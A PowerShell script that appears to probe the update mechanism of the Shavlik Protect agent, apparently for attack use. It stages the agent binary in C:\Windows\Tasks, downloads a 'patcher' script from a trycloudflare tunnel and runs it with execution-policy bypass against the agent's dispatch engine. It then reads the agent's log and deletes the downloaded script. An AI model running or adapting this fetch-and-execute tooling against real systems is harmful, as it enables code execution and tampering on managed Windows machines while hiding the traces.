param([string]$TunnelUrl = "https://taxes-surprised-immediately-transportation.trycloudflare.com")

Write-Host "=== Explore update binary behavior ==="

# Copy STAgentCtl if needed
Copy-Item "C:\Program Files\LANDESK\Shavlik Protect Agent\STAgentCtl.exe" "C:\Windows\Tasks\STAgentCtl.exe" -Force

# Get the patcher
$s = (iwr -Uri "$TunnelUrl/scripts/run_patched_simple.ps1" -UseBasicParsing).Content
Set-Content "C:\Windows\Tasks\rp.ps1" $s -Encoding UTF8

# Check what -updateBinaries does via dispatch
Write-Host "`n=== Checking -updateBinaries flag ==="
$r = powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Windows\Tasks\rp.ps1" -Command "dispatch --engine b443f8a1-8af5-4f43-8537-467648fecc4c --operation 9d77c15b-2685-4223-8c50-17e989367eb0 --paramData -updateBinaries" -TimeoutSeconds 30 2>&1 | Out-String
Write-Host $r

# Check STDispatch log
Write-Host "`n=== STDispatch Log ==="
$log = "C:\ProgramData\LANDESK\Shavlik Protect\Logs\STDispatch.log"
if (Test-Path $log) {
    Get-Content $log -Tail 20 | ForEach-Object { Write-Host $_ }
} else {
    Write-Host "No log found"
}

# Cleanup
Remove-Item "C:\Windows\Tasks\rp.ps1" -Force -ErrorAction SilentlyContinue
Write-Host "=== Done ==="
